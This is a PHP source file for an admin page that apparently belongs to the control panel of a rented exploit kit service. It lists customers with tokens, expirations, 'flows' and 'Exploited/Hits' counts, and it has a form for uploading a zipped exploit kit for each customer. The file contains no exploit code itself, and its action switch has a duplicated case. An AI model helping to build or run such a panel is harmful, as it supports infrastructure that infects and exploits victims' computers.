<?php
require_once('inc/config.php');
require_once 'inc/functions/lib/passwordLib.php';
?>
<?php if (!isset($_SESSION['admin']) or $_SESSION['admin'] != true) {
    header('Location: index.php');
    die();
}
?>
<?php $title = 'Users' ?>
<?php require_once('inc/functions/admin.php') ?>
<?php if (is_post() && check_token($_POST['token'])) {
    switch ($_POST['action']) {
    case 'create':
        $result = create_user($_POST['name'], $_POST['password'], $_POST['password2'], $_POST['expiration'], $_POST['flows']);
	break;
    case 'delete':
        $result = delete_user($_POST['name']);
    break;
    case 'changepwd':
        $result = change_pwd($_POST['name'], $_POST['password'], $_POST['password2']);
    break;
    case 'changeexp':
        $result = change_exp($_POST['name'], $_POST['expiration']);
    break;
    case 'changeexp':
        $result = change_uis($_POST['name'], $_POST['uid']);
    break;
    case 'changetoken':
        $result = change_token($_POST['name'], $_POST['ntoken']);
    break;
    case 'upload':
        $result = upload_kit($_POST['name'], $_FILES);
    break;
    }
}

?>
<?php require_once('inc/admin.header.php') ?>
<?php require_once('inc/admin.hnav.php') ?>
<?php require_once('inc/admin.lnav.php') ?>
		<!--main content start-->
        <section class="main-content-wrapper">
            <section id="main-content">
                <div class="row">
                    <div class="col-md-12">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Userlist</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <table id="userlist" class="table table-striped table-bordered" cellspacing="0" width="100%">
                                    <thead>
                                        <tr>
                                            <th>Name</th>
                                            <th>Token</th>
                                            <th>Expiration</th>
					    <th>Flows</th>
                                            <th>Last Login</th>
                                            <th>Last IP</th>
                                            <th>Exploited/Hits</th>
                                            <th>Comment</th>
                                        </tr>
                                    </thead>

                                    <tbody>
                                        <?php list_users() ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Create User</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                                <div class="panel-body">
                                <form role="form" method="post" action="">
                                    <div class="form-group">
                                        <label for="name">Name</label>
                                        <input type="text" class="form-control" id="name" placeholder="Enter username" name="name" required>
                                    </div>
                                    <div class="form-group">
                                        <label for="password">Password</label>
                                        <input type="password" class="form-control" id="password" placeholder="Password" name="password" required>
									</div>
                                     <div class="form-group">
                                        <label for="password">Password</label>
                                        <input type="password" class="form-control" id="password" placeholder="Password again" name="password2" required>
                                    </div>
									<div class="form-group">
                                        <label for="name">Flows</label>
										<input type="text" maxlength="2" onkeydown="return ( event.ctrlKey || event.altKey || (47<event.keyCode && event.keyCode<58 && event.shiftKey==false) || (95<event.keyCode && event.keyCode<106)|| (event.keyCode==8) || (event.keyCode==9) || (event.keyCode>34 && event.keyCode<40) || (event.keyCode==46) )" class="form-control" id="flows" placeholder="Enter the number of flows for the user" name="flows" required>
                                    </div>
                                    <div class="form-group">
                                        <label for="expiration">Expiration</label>
                                        <input type="text" class="form-control" name="expiration" id="expiration" placeholder="DD/MM/YYYY" name="expiration" required>
                                    </div>
                                    <input type="hidden" name="action" value="create" />
                                    <input type="hidden" name="token" value="<?php echo $_SESSION['csrf'] ?>" />
                                    <button type="submit" class="btn btn-primary">Submit</button>
                                </form>

                            </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Delete User</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <form role="form" method="post" action="">
                                    <div class="form-group">
                                        <label for="name">Name</label>
                                        <input type="text" class="form-control" id="name" placeholder="Enter username" name="name" required>
                                    </div>
                                    <input type="hidden" name="action" value="delete" />
                                    <input type="hidden" name="token" value="<?php echo $_SESSION['csrf'] ?>" />
                                    <button type="submit" class="btn btn-primary">Submit</button>
                                </form>


                            </div>
                            </div>
                        </div>
                    </div>
                    <div class="row">
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Change User Password</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <form role="form" method="post" action="">
                                    <div class="form-group">
                                        <label for="name">Name</label>
                                        <input type="text" class="form-control" id="name" placeholder="Enter username" name="name" required>
                                    </div>
                                    <div class="form-group">
                                        <label for="password">Password</label>
                                        <input type="password" class="form-control" id="password" placeholder="Password" name="password" required>
                                    </div>
                                     <div class="form-group">
                                        <label for="password">Password</label>
                                        <input type="password" class="form-control" id="password" placeholder="Password again" name="password2" required>
                                    </div>
                                    <input type="hidden" name="action" value="changepwd" />
                                    <input type="hidden" name="token" value="<?php echo $_SESSION['csrf'] ?>" />
                                    <button type="submit" class="btn btn-primary">Submit</button>
                                </form>

                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Change User Expiration</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                    <form role="form" method="post" action="">
                                    <div class="form-group">
                                        <label for="name">Name</label>
                                        <input type="text" class="form-control" id="name" placeholder="Enter username" name="name" required>
                                    </div>
                                    <div class="form-group">
                                        <label for="expiration">New expiration</label>
                                        <input type="text" class="form-control" name="expiration" id="newexpiration" placeholder="DD/MM/YYYY" name="expiration" required>
                                    </div>
                                    <input type="hidden" name="action" value="changeexp" />
                                    <input type="hidden" name="token" value="<?php echo $_SESSION['csrf'] ?>" />
                                    <button type="submit" class="btn btn-primary">Submit</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Upload Kit</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <form role="form" enctype="multipart/form-data" method="post" action="">
                                    <div class="form-group">
                                        <label for="name">Username</label>
                                        <input type="text" class="form-control" id="name" placeholder="The user for which the kit has been compiled" name="name" required>
                                    </div>
                                    <div class="form-group">
                                        <label for="file">Kit archive</label>
                                        <input type="file" id="file" name="file" required>
                                        <p class="help-block">If a file already exist it will be replaced. The exploit kit must be in only one directory and zipped.</p>
                                    </div>
                                    <input type="hidden" name="action" value="upload" />
                                    <input type="hidden" name="token" value="<?php echo $_SESSION['csrf'] ?>" />
                                    <button type="submit" class="btn btn-primary">Submit</button>
                                </form>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Change user uid</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <form role="form" method="post" action="">
                                    <div class="form-group">
                                        <label for="name">Username</label>
                                        <input type="text" class="form-control" id="name" placeholder="Username" name="name" required>
                                    </div>
                                    <div class="form-group">
                                        <label for="uid">New UID</label>
                                        <input type="text" class="form-control" id="uid" placeholder="UID" name="uid" required>
                                    </div>
                                    <input type="hidden" name="action" value="changeuid" />
                                    <input type="hidden" name="token" value="<?php echo $_SESSION['csrf'] ?>" />
                                    <button type="submit" class="btn btn-primary">Submit</button>
                                </form>
                            </div>
                        </div>
                    </div>

                    <div class="col-md-6">
                        <div class="panel panel-default">
                            <div class="panel-heading">
                                <h3 class="panel-title">Change user token</h3>
                                <div class="actions pull-right">
                                    <i class="fa fa-chevron-down"></i>
                                    <i class="fa fa-times"></i>
                                </div>
                            </div>
                            <div class="panel-body">
                                <form role="form" method="post" action="">
                                    <div class="form-group">
                                        <label for="name">Username</label>
                                        <input type="text" class="form-control" id="name" placeholder="Username" name="name" required>
                                    </div>
                                    <div class="form-group">
                                        <label for="uid">New Token</label>
                                        <input type="text" class="form-control" id="ntoken" placeholder="token" name="ntoken" required>
                                    </div>
                                    <input type="hidden" name="action" value="changetoken" />
                                    <input type="hidden" name="token" value="<?php echo $_SESSION['csrf'] ?>" />
                                    <button type="submit" class="btn btn-primary">Submit</button>
                                </form>
                            </div>
                        </div>
                    </div>

                </div>
            </section>
        </section>
    
</div>
    <!--main content end-->
    <!--Global JS-->
    <script src="static/js/jquery-1.10.2.min.js"></script>
    <script src="static/js/bootstrap.min.js"></script>
    <script src="static/plugins/navgoco/jquery.navgoco.min.js"></script>
    <script src="static/plugins/waypoints/waypoints.min.js"></script>
    <script src="static/plugins/switchery/switchery.min.js"></script>
    <script src="static/js/application.users.js"></script>
    <!--Page Level JS-->
    <script src="static/plugins/countTo/jquery.countTo.js"></script>
    <script src="static/plugins/dataTables/js/jquery.dataTables.js"></script>
    <script src="static/plugins/dataTables/js/dataTables.bootstrap.js"></script>
    <script src="static/plugins/mask/js/jquery.maskedinput.min.js"></script>
    <!--Load these page level functions-->
    <script>
    $(document).ready(function() {
        $('#userlist').dataTable();
        $("#expiration").mask("99/99/9999");
        $("#newexpiration").mask("99/99/9999");
    });
    </script>

</body>

</html>
